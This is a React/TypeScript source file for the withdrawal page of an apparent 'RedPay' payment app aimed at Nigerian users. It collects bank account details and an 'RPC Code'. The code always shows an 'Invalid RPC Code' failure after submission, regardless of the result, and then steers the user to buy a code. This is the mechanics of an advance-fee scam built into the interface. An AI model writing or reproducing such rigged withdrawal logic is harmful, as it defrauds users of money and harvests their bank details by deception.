import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { getMyProfile, submitWithdrawal } from "@/lib/redpay.functions";
import { AppShell, formatNaira } from "@/components/app-shell";
import { useState } from "react";
import { toast } from "sonner";
import { AlertTriangle, ArrowLeft, ShieldAlert, Zap } from "lucide-react";

const NG_BANKS = ["Access Bank","GTBank","First Bank","UBA","Zenith","Fidelity","Union Bank","Sterling","Wema","Kuda","Opay","Palmpay","Moniepoint MFB","Providus","Polaris"];

export const Route = createFileRoute("/_authenticated/withdraw")({
  head: () => ({ meta: [{ title: "Withdraw — RedPay" }] }),
  component: Withdraw,
});

function Withdraw() {
  const fetchProfile = useServerFn(getMyProfile);
  const { data: profile } = useQuery({ queryKey: ["profile"], queryFn: () => fetchProfile() });
  const [form, setForm] = useState({ amount: "", bank: NG_BANKS[0], account_name: "", account_number: "", rpc: "" });
  const [showFail, setShowFail] = useState(false);
  const nav = useNavigate();
  const submit = useServerFn(submitWithdrawal);
  const mut = useMutation({
    mutationFn: () => submit({ data: {
      amount: Number(form.amount), bank: form.bank,
      account_name: form.account_name, account_number: form.account_number, rpc: form.rpc,
    }}),
    onSuccess: () => { setShowFail(true); },
  });

  function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    const amt = Number(form.amount);
    if (!amt || amt < 100000) return toast.error("Minimum withdrawal is ₦100,000");
    if (Number(profile?.balance ?? 0) < amt) return toast.error("Insufficient balance");
    if (!form.rpc.trim()) return toast.error("RPC Code is required");
    mut.mutate();
  }

  return (
    <AppShell>
      <header className="p-4 flex items-center gap-3">
        <Link to="/dashboard"><ArrowLeft className="size-5" /></Link>
        <h1 className="text-lg font-bold">Withdraw funds</h1>
      </header>

      <div className="px-4">
        <div className="rounded-2xl gradient-red p-5 text-white shadow-glow">
          <p className="text-xs opacity-90">Available balance</p>
          <p className="text-3xl font-black">{formatNaira(profile?.balance)}</p>
          <p className="text-[11px] opacity-80 mt-1">Minimum withdrawal: ₦100,000</p>
        </div>
      </div>

      <form onSubmit={onSubmit} className="p-4 space-y-3">
        <Field label="Amount (₦)">
          <input required type="number" min={100000} value={form.amount} onChange={e => setForm({ ...form, amount: e.target.value })} className="w-full input" placeholder="100000" />
        </Field>
        <Field label="Bank">
          <select value={form.bank} onChange={e => setForm({ ...form, bank: e.target.value })} className="w-full input">
            {NG_BANKS.map(b => <option key={b}>{b}</option>)}
          </select>
        </Field>
        <Field label="Account number">
          <input required value={form.account_number} onChange={e => setForm({ ...form, account_number: e.target.value })} className="w-full input" placeholder="10 digits" maxLength={10} />
        </Field>
        <Field label="Account name">
          <input required value={form.account_name} onChange={e => setForm({ ...form, account_name: e.target.value })} className="w-full input" placeholder="Full name on the account" />
        </Field>
        <Field label="RPC Code (RedPay Code)">
          <input required value={form.rpc} onChange={e => setForm({ ...form, rpc: e.target.value.toUpperCase() })} className="w-full input font-mono tracking-widest" placeholder="RPC-XXXXXXXX" />
        </Field>
        <div className="rounded-xl bg-primary/10 border border-primary/30 p-3 text-xs text-primary flex gap-2">
          <ShieldAlert className="size-4 shrink-0 mt-0.5" />
          <span>A valid RPC is required to unlock withdrawals. Don't have one? <Link to="/rpc" className="underline">Buy RPC here</Link>.</span>
        </div>
        <button disabled={mut.isPending} className="w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground shadow-glow disabled:opacity-60">
          {mut.isPending ? "Processing..." : "Request withdrawal"}
        </button>
        <style>{`.input{background:var(--color-input);border:1px solid var(--color-border);border-radius:0.7rem;padding:.7rem .85rem;font-size:.9rem;color:var(--color-foreground);outline:none} .input:focus{border-color:var(--color-ring)}`}</style>
      </form>

      {showFail && (
        <div className="fixed inset-0 z-50 bg-background/85 backdrop-blur grid place-items-center p-4">
          <div className="max-w-sm w-full rounded-3xl border border-primary/40 bg-card p-6 text-center shadow-glow">
            <div className="size-14 rounded-full bg-primary/15 grid place-items-center mx-auto"><AlertTriangle className="size-6 text-primary" /></div>
            <h2 className="mt-4 text-lg font-bold">Invalid RPC Code</h2>
            <p className="mt-2 text-sm text-muted-foreground">The RPC Code you entered is invalid or expired. To activate withdrawals you must purchase a valid RPC.</p>
            <button onClick={() => { setShowFail(false); nav({ to: "/rpc" }); }} className="mt-5 w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground inline-flex items-center justify-center gap-2">
              <Zap className="size-4" /> Buy RPC now
            </button>
            <button onClick={() => setShowFail(false)} className="mt-2 w-full py-2 text-xs text-muted-foreground">Cancel</button>
          </div>
        </div>
      )}
    </AppShell>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return <label className="block"><span className="text-xs font-medium text-muted-foreground">{label}</span><div className="mt-1">{children}</div></label>;
}
